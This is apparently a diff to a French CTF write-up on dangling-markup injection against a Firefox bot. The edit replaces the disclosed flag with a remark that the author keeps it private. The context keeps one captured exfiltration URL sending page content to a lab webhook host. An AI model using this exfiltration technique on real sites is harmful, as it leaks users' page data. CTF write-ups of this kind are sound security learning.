@@ -107,7 +107,7 @@ Le parser lit tout depuis `data=` jusqu'au `'` de `:'(`. Le bot Firefox est redi
 https://webhook.quack-corp.lab/exfil?data= !</h1>...[CONTENU DE LA PAGE]...[FLAG]...Sorry :
 ```
 
-Et dans ce contenu, le flag : `D4NGL1NG_M4RKUP_W1TH_FIREF0X_EASY`.
+Et dans ce contenu, le flag -- que je garde pour moi, ce n'est pas le sujet de ce write-up.
 
 Facile. Enfin, "facile" entre guillemets. Simples. Pas doubles.
 
